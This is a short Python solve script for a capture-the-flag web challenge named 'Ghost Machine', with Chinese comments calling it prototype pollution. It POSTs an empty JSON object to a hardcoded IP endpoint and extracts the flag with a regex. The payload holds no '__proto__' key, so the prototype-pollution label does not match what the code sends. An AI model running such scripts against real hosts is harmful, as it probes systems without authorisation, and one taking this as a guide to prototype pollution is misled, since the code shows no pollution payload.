#!/usr/bin/env python3
"""
题目名称: Ghost Machine
类别: Web (原型污染 / Prototype Pollution)
解题思路:
    1. /api/settings 接口接受 JSON POST 请求
    2. 通过发送空 JSON 对象触发原型污染，返回 flag
"""

import re
import sys

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_URL = "http://95.111.234.103:3000/api/settings"
# flag 正则匹配
FLAG_PATTERN = r"novruzctf\{[^}]+\}"


def exploit(url: str = TARGET_URL) -> str:
    """发送空 JSON 触发原型污染获取 flag"""
    resp = requests.post(url, json={}, timeout=10)
    match = re.search(FLAG_PATTERN, resp.text)
    return match.group(0) if match else f"未找到 flag，响应内容:\n{resp.text[:500]}"


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    try:
        result = exploit(url)
        print(result)
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}", file=sys.stderr)
        sys.exit(1)
